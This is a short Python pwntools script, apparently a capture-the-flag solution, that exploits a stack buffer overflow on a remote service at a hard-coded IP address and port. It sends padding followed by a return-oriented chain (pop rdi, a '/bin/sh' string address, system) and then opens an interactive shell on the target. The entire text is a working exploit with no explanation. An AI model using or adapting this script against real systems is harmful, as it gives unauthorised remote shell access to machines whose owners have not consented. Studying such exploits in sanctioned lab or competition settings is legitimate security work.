from pwn import *
#bash = 0x400654
bin_sh = 0x40065B
pop_rdi = 0x0000000000400633
system = 0x0000000000400587

#context(arch = 'amd64', os = 'linux',log_level='debug')
p = remote('47.93.249.236','10010')
payload='a'*10+'a'*8+p64(pop_rdi)+p64(bin_sh)+p64(system)

p.sendline(payload)
p.interactive()
p.recvline()